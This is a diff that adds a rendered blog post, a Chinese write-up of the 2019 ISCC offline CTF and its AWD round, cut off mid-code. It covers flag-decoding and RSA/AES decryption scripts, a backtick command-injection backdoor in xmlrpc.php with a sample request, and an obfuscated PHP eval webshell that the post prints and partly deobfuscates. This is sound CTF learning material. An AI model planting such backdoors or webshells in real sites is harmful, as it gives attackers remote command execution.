@@ -1,79 +1,479 @@
-extends includes/layout.pug
 
-block top_img
-  - var top_img =  page.top_img || page.cover || theme.post_meta.top_img || theme.default_top_img
-  - var bg_img = top_img !== true ? `background-image: url(${top_img})` : ''
-  div#top-container(style=bg_img)
-    #post-info
-      #post-title
-          .posttitle= page.title || _p('no_title')
-      #post-meta
-        if (theme.post_meta.date_type)
-          if (theme.post_meta.date_type === 'both')
-            time.post-meta__date
-              i.fa.fa-calendar(aria-hidden="true")
-              =' '+_p('post.created')+' '+date(page.date, config.date_format)
-              span.post-meta__separator |
-              i.fa.fa-history(aria-hidden="true")
-              =' '+_p('post.updated')+' '+date(page.updated, config.date_format)
-          else
-            - var date_type = theme.post_meta.date_type === 'updated' ? 'updated' : 'date'
-            time.post-meta__date #[i.fa.fa-calendar(aria-hidden="true")] #[=date(page[date_type], config.date_format)]
-                  
-        if (theme.post_meta.categories && page.categories.data.length > 0)
-          if (theme.post_meta.date_type)
-            span.post-meta__separator.mobile_hidden |
-          span.mobile_hidden
-            each item, index in page.categories.data
-              i.fa.fa-inbox.post-meta__icon(aria-hidden="true")
-              a(href=url_for(item.path)).post-meta__categories #[=item.name]
-              if (index < page.categories.data.length - 1)
-                i.fa.fa-angle-right(aria-hidden="true")
-        .post-meta-wordcount
-          if (theme.wordcount && theme.wordcount.enable)
-            i.fa.fa-file-word-o.post-meta__icon(aria-hidden="true")
-            span= _p('post.wordcount') + ': '
-            span.word-count= wordcount(page.content)
-            span.post-meta__separator |
-            i.fa.fa-clock-o.post-meta__icon(aria-hidden="true")
-            span= _p('post.min2read', min2read(page.content, {cn: 350, en: 160}))
-          if (theme.wordcount && theme.wordcount.enable && theme.busuanzi.page_pv)
-            span.post-meta__separator |
-          if theme.busuanzi.page_pv
-            i.fa.fa-eye.post-meta__icon(aria-hidden="true")        
-            span= _p('post.page_pv') + ': '
-            span#busuanzi_value_page_pv
+<!DOCTYPE html>
+<html lang class="loading">
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>2019 ISCC — 线下赛WriteUp - Knlvre</title>
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate">
+    <meta name="keywords" content="TriDiamond Obsidian,"> 
+    <meta name="description" content="前言本次比赛的赛程安排是上午解题，下午AWD。算是真正意义上第一次参加AWD比赛，记录一下学习的内容
+PWN123456789101112131415161718192021222324252627,"> 
+    <meta name="author" content="Knlvre"> 
+    <link rel="alternative" href="atom.xml" title="Knlvre" type="application/atom+xml"> 
+    <link rel="icon" href="knlvre.github.io/img/favicon.png"> 
+    <link href="https://fonts.loli.net/css?family=Roboto+Mono|Rubik&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="//at.alicdn.com/t/font_1429596_nzgqgvnmkjb.css">
+    <link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.7.2/animate.min.css">
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css">
+    <link rel="stylesheet" href="//cdn.bootcss.com/codemirror/5.48.4/codemirror.min.css">
+    <link rel="stylesheet" href="//cdn.bootcss.com/codemirror/5.48.4/theme/dracula.css">
+    <link rel="stylesheet" href="knlvre.github.io/css/obsidian.css">
+    <link rel="stylesheet" href="knlvre.github.io/css/ball-atom.min.css">
+</head>
+</html>
+
+<body class="loading">
+    <div class="loader">
+        <div class="la-ball-atom la-2x">
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+        </div>
+    </div>
+    <span id="config-title" style="display:none">Knlvre</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div class="scrollbar gradient-bg-rev"></div>
+<div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <div class="navigation animated fadeIn fast delay-1s">
+        <img id="home-icon" class="icon-home" src="/img/favicon.png" alt="" data-url="https://knlvre.github.io">
+        <div id="play-icon" title="Play/Pause" class="iconfont icon-play"></div>
+        <h3 class="subtitle">2019 ISCC — 线下赛WriteUp</h3>
+        <div class="social">
+            <!--        <div class="like-icon">-->
+            <!--            <a href="javascript:;" class="likeThis active"><span class="icon-like"></span><span class="count">76</span></a>-->
+            <!--        </div>-->
+            <div>
+                <div class="share">
+                    
+                        <a href="javascript:;" class="iconfont icon-share1"></a>
+                        <div class="share-component-cc" data-disabled="facebook,douban,linkedin,diandian,tencent,google"></div>
+                    
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+    <div class="section">
+        <div class=article-header-wrapper>
+    <div class="article-header">
+        <div class="article-cover animated fadeIn" style="
+            animation-delay: 600ms;
+            animation-duration: 1.2s;
+            background-image: 
+                radial-gradient(ellipse closest-side, rgba(0, 0, 0, 0.65), #100e17),
+                url(/img/cover.jpg);">
+        </div>
+        <div class="else">
+            <p class="animated fadeInDown">
+                
+                <a href="javascript:;"><b>「 </b>Article<b> 」</b></a>
+                
+                July 26, 2019
+            </p>
+            <h3 class="post-title animated fadeInDown"><a href="knlvre.github.io/2019/07/26/CTF比赛—2019ISCC线下赛WriteUp/" title="2019 ISCC — 线下赛WriteUp">2019 ISCC — 线下赛WriteUp</a>
+            </h3>
+            
+            <p class="post-count animated fadeInDown">
+                
+                <span>
+                    <b class="iconfont icon-text2"></b> <i>Words count</i>
+                    42k
+                </span>
+                
+                
+                <span>
+                    <b class="iconfont icon-timer__s"></b> <i>Reading time</i>
+                    38 mins.
+                </span>
+                
+                
+                
+                <span id="busuanzi_container_page_pv">
+                    <b class="iconfont icon-read"></b> <i>Read count</i>
+                    <span id="busuanzi_value_page_pv">0</span>
+                </span>
+                
+            </p>
+            
+            
+            <ul class="animated fadeInDown post-tags-list"><li class="animated fadeInDown post-tags-list-item"><a class="animated fadeInDown post-tags-list-link" href="knlvre.github.io/tags/CTF比赛/">CTF比赛</a></li></ul>
+            
+        </div>
+    </div>
+</div>
+
+<div class="screen-gradient-after">
+    <div class="screen-gradient-content">
+        <div class="screen-gradient-content-inside">
+            <div class="bold-underline-links screen-gradient-sponsor">
+                <p>
+                    <span class="animated fadeIn delay-1s"></span>
+                </p>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="article">
+    <div class='main'>
+        <div class="content markdown animated fadeIn">
+            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本次比赛的赛程安排是上午解题，下午AWD。算是真正意义上第一次参加AWD比赛，记录一下学习的内容</p>
+<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">dic = string.printable</span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"></span><br><span class="line">pair = [</span><br><span class="line">    <span class="number">0x17F5B345</span>,<span class="number">0x17F5B30C</span>,</span><br><span class="line">    <span class="number">0xF16B77E2</span>,<span class="number">0xF16B77B1</span>,</span><br><span class="line">    <span class="number">0xB2B21947</span>,<span class="number">2998016260</span>,</span><br><span class="line">    <span class="number">0x58A9F98B</span>,<span class="number">1487534536</span>,</span><br><span class="line">    <span class="number">0x20A99D0A</span>,<span class="number">547986801</span>,</span><br><span class="line">    <span class="number">0x96D85B20</span>,<span class="number">2530761537</span>,</span><br><span class="line">    <span class="number">0xBBEA9A3E</span>,<span class="number">3152714326</span>,</span><br><span class="line">    <span class="number">0x35512DBE</span>,<span class="number">894512607</span>,</span><br><span class="line">    <span class="number">0x2838DCF7</span>,<span class="number">674815144</span>,</span><br><span class="line">    <span class="number">0x4EA1DF87</span>,<span class="number">1319231476</span>,</span><br><span class="line">    <span class="number">0xE22DCCED</span>,<span class="number">3794652292</span>,</span><br><span class="line">    <span class="number">0xDD2C662E</span>,<span class="number">3710674499</span>,</span><br><span class="line">    <span class="number">0x106B37C4</span>,<span class="number">275462068</span>,</span><br><span class="line">    <span class="number">0x46B4426E</span>,<span class="number">1186218498</span>,</span><br><span class="line">    <span class="number">0xAA67C7F4</span>,<span class="number">2858928017</span>,</span><br><span class="line">    <span class="number">0x72C06EBD</span>,<span class="number">1925213922</span>,</span><br><span class="line">    <span class="number">0xB0117F7F</span>,<span class="number">2953936653</span>,</span><br><span class="line">    <span class="number">0xF91B93EC</span>,<span class="number">4179334025</span>,</span><br><span class="line">    <span class="number">0xD43CE914</span>,<span class="number">3560761698</span>,</span><br><span class="line">    <span class="number">0xF6EA0CED</span>,<span class="number">4142533768</span>,</span><br><span class="line">    <span class="number">0x402A0997</span>,<span class="number">1076496869</span>,</span><br><span class="line">    <span class="number">0xADACB707</span>,<span class="number">2913777524</span>,</span><br><span class="line">    <span class="number">0xE79C5520</span>,<span class="number">3885782341</span>,</span><br><span class="line">    <span class="number">0x4B76BD4C</span>,<span class="number">1266072881</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(pair),<span class="number">2</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">        <span class="keyword">if</span> ord(j) ^ pair[i] == pair[i+<span class="number">1</span>]:</span><br><span class="line">            flag += j</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure>
+<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><p>本次的MISC题目是<code>流量分析</code>+<code>RSA解密</code></p>
+<p>HTTP 流量有几个尝试注入的包，应该是迷惑用的</p>
+<p>题目给的 secret 文件，看格式像是 RSA 秘钥，看长度像是 RSA 私钥，于是添加私钥头补全</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">xxxx</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure>
+<p>这里注意 secret 里是有两个私钥的，分别提出保存</p>
+<p>用 <code>tcp &amp;&amp; ip.dst == 10.0.0.0/8 &amp;&amp; !http</code> 规则过滤掉干扰包，发现一个 tcp 流里有疑似公钥的信息，以及一个 <code>secure message tool v1.0</code> 的明文，联想到题目给的  secret 私钥，于是分别提取出公钥，公钥头格式如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN RSA PUBLIC KEY-----</span><br><span class="line">xxx</span><br><span class="line">-----END RSA PUBLIC KEY-----</span><br></pre></td></tr></table></figure>
+<p>然后构造脚本解密</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> rsa</span><br><span class="line"></span><br><span class="line"><span class="comment"># tcp.stream eq 128 and secret file</span></span><br><span class="line">files = [<span class="string">'a.pub'</span>, <span class="string">'a.pri'</span>, <span class="string">'b.pub'</span>, <span class="string">'b.pri'</span>]</span><br><span class="line">lst = &#123;</span><br><span class="line">    <span class="string">'a.pub'</span>:<span class="number">0</span>,</span><br><span class="line">    <span class="string">'a.pri'</span>:<span class="number">0</span>,</span><br><span class="line">    <span class="string">'b.pub'</span>:<span class="number">0</span>,</span><br><span class="line">    <span class="string">'b.pri'</span>:<span class="number">0</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># load rsa key</span></span><br><span class="line"><span class="keyword">for</span> f <span class="keyword">in</span> files:</span><br><span class="line">    <span class="keyword">with</span> open(f, <span class="string">'r'</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        <span class="keyword">if</span> f.endswith(<span class="string">'pub'</span>):</span><br><span class="line">            lst[f] = rsa.PublicKey.load_pkcs1(fp.read().encode())</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            lst[f] = rsa.PrivateKey.load_pkcs1(fp.read().encode())</span><br><span class="line"></span><br><span class="line"><span class="comment"># decrypt messages from wireshark tcp.stream eq 128</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'./messages.txt'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> fp:</span><br><span class="line">    <span class="keyword">for</span> msg <span class="keyword">in</span> fp.readlines():</span><br><span class="line">        msg = msg.strip().split(<span class="string">':'</span>)</span><br><span class="line">        sender = msg[<span class="number">0</span>]</span><br><span class="line">        content = msg[<span class="number">1</span>].decode(<span class="string">'hex'</span>)</span><br><span class="line">        <span class="keyword">if</span> sender == <span class="string">'A'</span>:</span><br><span class="line">                plain_text = rsa.decrypt(content, lst[<span class="string">'a.pri'</span>])</span><br><span class="line">        <span class="keyword">elif</span> sender == <span class="string">'B'</span>:</span><br><span class="line">                plain_text = rsa.decrypt(content, lst[<span class="string">'b.pri'</span>])</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'&#123;&#125; =&gt; &#123;&#125;'</span>.format(sender, plain_text)</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/ISCC%E7%BA%BF%E4%B8%8B%E8%B5%9B/1-1.png" alt="1-1"></p>
+<p>用私钥是能够成功解密的，但解密了一半抛异常，观察了一下解密出的信息，发现是一个类似握手的过程，其中确定了后续传输的加密方式为 <code>AES256 ECB</code> 模式以及传输秘钥 key</p>
+<p>key的长度是 32，符合 AES256 的要求，于是改了一下脚本，后续用 AES256 ECB 继续解密，得到所有传输的明文，脚本如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> rsa</span><br><span class="line"></span><br><span class="line"><span class="comment"># tcp.stream eq 128 and secret file</span></span><br><span class="line">files = [<span class="string">'a.pub'</span>, <span class="string">'a.pri'</span>, <span class="string">'b.pub'</span>, <span class="string">'b.pri'</span>]</span><br><span class="line"></span><br><span class="line">lst = &#123;</span><br><span class="line">    <span class="string">'a.pub'</span>:<span class="number">0</span>,</span><br><span class="line">    <span class="string">'a.pri'</span>:<span class="number">0</span>,</span><br><span class="line">    <span class="string">'b.pub'</span>:<span class="number">0</span>,</span><br><span class="line">    <span class="string">'b.pri'</span>:<span class="number">0</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># load rsa key</span></span><br><span class="line"><span class="keyword">for</span> f <span class="keyword">in</span> files:</span><br><span class="line">    <span class="keyword">with</span> open(f, <span class="string">'r'</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        <span class="keyword">if</span> f.endswith(<span class="string">'pub'</span>):</span><br><span class="line">            lst[f] = rsa.PublicKey.load_pkcs1(fp.read().encode())</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            lst[f] = rsa.PrivateKey.load_pkcs1(fp.read().encode())</span><br><span class="line"></span><br><span class="line"><span class="comment"># decrypt messages</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'./messages.txt'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> fp:</span><br><span class="line">    <span class="keyword">for</span> msg <span class="keyword">in</span> fp.readlines():</span><br><span class="line">        msg = msg.strip().split(<span class="string">':'</span>)</span><br><span class="line">        sender = msg[<span class="number">0</span>]</span><br><span class="line">        content = msg[<span class="number">1</span>].decode(<span class="string">'hex'</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> sender == <span class="string">'A'</span>:</span><br><span class="line">                    plain_text = rsa.decrypt(content, lst[<span class="string">'a.pri'</span>])</span><br><span class="line">            <span class="keyword">elif</span> sender == <span class="string">'B'</span>:</span><br><span class="line">                    plain_text = rsa.decrypt(content, lst[<span class="string">'b.pri'</span>])</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'&#123;&#125; =&gt; &#123;&#125;'</span>.format(sender, plain_text)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># get AES256 ECB KEY = CZS3MgDiippCb67ojMpFRnPu9FfLvIn6</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">key = <span class="string">'CZS3MgDiippCb67ojMpFRnPu9FfLvIn6'</span></span><br><span class="line">aes = AES.new(key, AES.MODE_ECB)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'./ecb_messages.txt'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> fp:</span><br><span class="line">    <span class="keyword">for</span> msg <span class="keyword">in</span> fp.readlines():</span><br><span class="line">        msg = msg.strip().split(<span class="string">':'</span>)</span><br><span class="line">        sender = msg[<span class="number">0</span>]</span><br><span class="line">        content = msg[<span class="number">1</span>].decode(<span class="string">'hex'</span>)</span><br><span class="line">        plain_text = aes.decrypt(content)</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'&#123;&#125; =&gt; &#123;&#125;'</span>.format(sender, plain_text)</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/ISCC%E7%BA%BF%E4%B8%8B%E8%B5%9B/1-2.png" alt="1-2"></p>
+<h2 id="AWD私地"><a href="#AWD私地" class="headerlink" title="AWD私地"></a>AWD私地</h2><p>本次比赛私地的使用的cms是<code>emblog 5.3.1</code></p>
+<p>我们的队伍只发现一个getshell的点，但是却需要进入后台利用。当发现时，几乎所有队伍都已经进入后台并改掉了密码，也没找到其他前台的漏洞，所以本次比赛并没有拿进攻分数。但是上的<code>Firewall</code>效果不错，防守分数并没有被扣掉太多。</p>
+<h3 id="1-文件上传getshell"><a href="#1-文件上传getshell" class="headerlink" title="1. 文件上传getshell"></a>1. 文件上传getshell</h3><p>前台没有找到其他漏洞，最后根据提示的<code>isccadmin</code>作为用户名，爆破拿到的密码是<code>passw0rd</code>。从后来的情况来看，所有队伍都做到了这一步，进入后台，修改了密码</p>
+<p>进入后台，有很多上传的点，我们是上传<code>管理员头像</code>处，上传了<code>一句话</code>，拿到了shell</p>
+<p>这个漏洞比较坑的是，前期管理员没有给上传的权限，之后有队伍反应，后来才又开了权限，才能上传</p>
+<h3 id="2-xmlrpc-php中的命令注入"><a href="#2-xmlrpc-php中的命令注入" class="headerlink" title="2. xmlrpc.php中的命令注入"></a>2. xmlrpc.php中的命令注入</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 向客户端发送api支持信息</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'rsd'</span>])) &#123;</span><br><span class="line">	$rsd=$_GET[<span class="string">'rsd'</span>];</span><br><span class="line">	<span class="keyword">echo</span> `$rsd`;</span><br><span class="line">	header(<span class="string">'Content-Type: text/xml; charset=utf-8'</span>, <span class="keyword">true</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="string">			&lt;rsd version="1.0" xmlns="http://archipelago.phrasewise.com/rsd"&gt;</span></span><br><span class="line"><span class="string">				&lt;service&gt;</span></span><br><span class="line"><span class="string">					&lt;engineName&gt;emlog&lt;/engineName&gt;</span></span><br><span class="line"><span class="string">					&lt;engineLink&gt;http://emlog.net/&lt;/engineLink&gt;</span></span><br><span class="line"><span class="string">					&lt;homePageLink&gt;'</span> . $options_cache[<span class="string">'blogurl'</span>] . <span class="string">'&lt;/homePageLink&gt;</span></span><br><span class="line"><span class="string">					&lt;apis&gt;</span></span><br><span class="line"><span class="string">						&lt;api name="MetaWeblog" blogID="1" preferred="true" apiLink="'</span> . $options_cache[<span class="string">'blogurl'</span>] . <span class="string">'xmlrpc.php" /&gt;</span></span><br><span class="line"><span class="string">						&lt;api name="Blogger" blogID="1" preferred="false" apiLink="'</span> . $options_cache[<span class="string">'blogurl'</span>] . <span class="string">'xmlrpc.php" /&gt;</span></span><br><span class="line"><span class="string">					&lt;/apis&gt;</span></span><br><span class="line"><span class="string">				&lt;/service&gt;</span></span><br><span class="line"><span class="string">			&lt;/rsd&gt;</span></span><br><span class="line"><span class="string">		 '</span>;</span><br><span class="line">	<span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>其中，注入点在于</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$rsd=$_GET[<span class="string">'rsd'</span>];</span><br><span class="line"><span class="keyword">echo</span> `$rsd`;</span><br></pre></td></tr></table></figure>
+<p>在php中，<code>反斜杠</code>可以用于快速执行cmd的代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?rsd=chdir</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/ISCC%E7%BA%BF%E4%B8%8B%E8%B5%9B/2-1.png" alt="2-1"></p>
+<p>随便写个python测试，也可以直接执行</p>
+<p>比赛中就直接用这个方法去运行getflag程序，这样就无需再进入后台</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/ISCC%E7%BA%BF%E4%B8%8B%E8%B5%9B/2-2.png" alt="2-2"></p>
+<h3 id="3-代码混淆"><a href="#3-代码混淆" class="headerlink" title="3.  代码混淆"></a>3.  代码混淆</h3><p>在<code>include\model\log_model.php</code>的开头</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$o=<span class="string">'n();$r=@bas&#125;&gt;&#125;&gt;e64_encode(@x(&#125;&gt;@gzc&#125;&gt;o&#125;&gt;mpress($o),$&#125;&gt;k));p&#125;&gt;rint("&#125;&gt;$p$kh&#125;&gt;$r$kf");&#125;'</span>;</span><br><span class="line">$g=<span class="string">'&gt;EgwZ7H&#125;&gt;iEecl&#125;&gt;S";function &#125;&gt;x($t,$&#125;&gt;k)&#123;$&#125;&gt;&#125;&gt;c=s&#125;&gt;trlen(&#125;&gt;$k)&#125;&gt;;$l=strlen($t);$o="'</span>;</span><br><span class="line">$l=<span class="string">'";&#125;&gt;f&#125;&gt;or($i=0;$&#125;&gt;&#125;&gt;i&lt;$l;)&#123;for($&#125;&gt;j=&#125;&gt;0;&#125;&gt;&#125;&gt;($j&lt;$c&amp;&amp;$i&lt;$l&#125;&gt;);$j++,$i++)&#123;$o.&#125;&gt;&#125;&gt;=$'</span>;</span><br><span class="line">$r=<span class="string">'_contents&#125;&gt;("p&#125;&gt;&#125;&gt;hp://i&#125;&gt;nput")&#125;&gt;,$m)==1)&#123;@ob_star&#125;&gt;t(&#125;&gt;);@&#125;&gt;eva&#125;&gt;l(@gzu&#125;&gt;ncompress('</span>;</span><br><span class="line">$L=<span class="string">'$k="5ac&#125;&gt;91f7&#125;&gt;d";$&#125;&gt;kh=&#125;&gt;&#125;&gt;"b9615a29&#125;&gt;bc1d";&#125;&gt;$kf="24d0b67&#125;&gt;c2c91";$p&#125;&gt;="9GmI&#125;&gt;&#125;'</span>;</span><br><span class="line">$s=str_replace(<span class="string">'C'</span>,<span class="string">''</span>,<span class="string">'cCreaCteC_fCuCCnction'</span>);</span><br><span class="line">$Z=<span class="string">'t&#123;$i&#125;^&#125;&gt;$k&#123;$&#125;&gt;j&#125;&gt;&#125;;&#125;&#125;ret&#125;&gt;urn $o;&#125;&#125;&gt;if(@preg_match&#125;&gt;&#125;&gt;("&#125;&gt;/$kh(.+&#125;&gt;)$kf&#125;&gt;/",@file_&#125;&gt;get'</span>;</span><br><span class="line">$h=<span class="string">'@x(@ba&#125;&gt;se64&#125;&gt;_d&#125;&gt;ecode($m[1])&#125;&gt;,$&#125;&gt;&#125;&gt;k)))&#125;&gt;;&#125;&gt;$o=@&#125;&gt;ob_get_contents();@ob_&#125;&gt;en&#125;&gt;d_cl&#125;&gt;ea'</span>;</span><br><span class="line">$q=str_replace(<span class="string">'&#125;&gt;'</span>,<span class="string">''</span>,$L.$g.$l.$Z.$r.$h.$o);</span><br><span class="line">$I=$s(<span class="string">''</span>,$q);$I();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>打印<code>$s</code>和<code>$q</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#  $s的结果</span></span><br><span class="line">create_function</span><br><span class="line">   </span><br><span class="line"><span class="comment">#  $q的结果</span></span><br><span class="line">$k=<span class="string">"5ac91f7d"</span>;</span><br><span class="line">$kh=<span class="string">"b9615a29bc1d"</span>;</span><br><span class="line">$kf=<span class="string">"24d0b67c2c91"</span>;</span><br><span class="line">$p=<span class="string">"9GmIEgwZ7HiEeclS"</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">x</span><span class="params">($t,$k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $c=strlen($k);</span><br><span class="line">    $l=strlen($t);</span><br><span class="line">    $o=<span class="string">""</span>;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;$l;)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>($j=<span class="number">0</span>;($j&lt;$c&amp;&amp;$i&lt;$l);$j++,$i++)</span><br><span class="line">        &#123;</span><br><span class="line">            $o.=$t&#123;$i&#125;^$k&#123;$j&#125;;</span><br><span class="line">        &#125;</span><br><span 